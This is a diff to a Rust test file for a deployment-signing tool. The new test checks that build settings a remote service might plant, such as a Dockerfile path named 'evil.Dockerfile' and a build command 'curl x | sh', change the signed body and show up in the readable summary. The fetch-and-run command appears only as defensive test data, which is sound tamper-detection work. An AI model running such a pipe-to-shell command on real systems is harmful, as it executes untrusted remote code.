@@ -142,7 +142,8 @@ fn the_summary_shows_what_the_body_pins() {
     let web = &summary.services[0];
     assert_eq!(
         web.builds,
-        "Dockerfile in ., for linux/amd64, with the Actions cache"
+        "Dockerfile in ., for linux/amd64, with the Actions cache, build args PLAIN=one, \
+         build secrets SECRET"
     );
     assert!(
         web.changes.is_empty(),
@@ -157,6 +158,51 @@ fn the_summary_shows_what_the_body_pins() {
             r#"restart {"name":"unless-stopped"}"#
         ]
     );
+}
+
+/// Each build setting Cloud could plant changes the body the person signs and what they
+/// read: the builder runs the signed policy exactly.
+#[test]
+fn every_signed_build_setting_shows() {
+    let base = golden();
+    for (path, value, shown) in [
+        ("/root_dir", json!("apps/web"), "Dockerfile in apps/web,"),
+        (
+            "/build/dockerfilePath",
+            json!("evil.Dockerfile"),
+            "evil.Dockerfile in .,",
+        ),
+        ("/build/buildMethod", json!("railpack"), "Railpack in .,"),
+    ] {
+        let (parent, field) = path.rsplit_once('/').unwrap();
+        let mut view = view_json();
+        view["sources"][0].pointer_mut(parent).unwrap()[field] = value;
+        let planted = basis(view);
+        let next = AutoDeployRule::draft(&planted, &planted.branch_services(), terms())
+            .unwrap()
+            .drafted(&planted)
+            .unwrap();
+        assert_ne!(next.body, base.body, "{path} is signed");
+        let builds = &next.summary.services[0].builds;
+        assert!(builds.starts_with(shown), "{path}: {builds}");
+    }
+    let mut view = view_json();
+    view["sources"][0]["build"] = json!({"buildMethod": "railpack", "command": "curl x | sh"});
+    let planted = basis(view);
+    let railpack = AutoDeployRule::draft(&planted, &planted.branch_services(), terms()).unwrap();
+    let mut view = view_json();
+    view["sources"][0]["build"] = json!({"buildMethod": "railpack"});
+    let plain = basis(view);
+    let detected = AutoDeployRule::draft(&plain, &plain.branch_services(), terms()).unwrap();
+    assert_ne!(railpack.services[0].policy, detected.services[0].policy);
+    assert!(
+        builds(&railpack.services[0].policy).starts_with(r#"Railpack running "curl x | sh" in .,"#),
+        "{}",
+        builds(&railpack.services[0].policy)
+    );
+    let mut targeted = detected.services[0].policy.clone();
+    targeted.target = Some("release".into());
+    assert!(builds(&targeted).contains(", target release"));
 }
 
 /// Each field Cloud could plant in a Saved spec changes what the person reads, since the
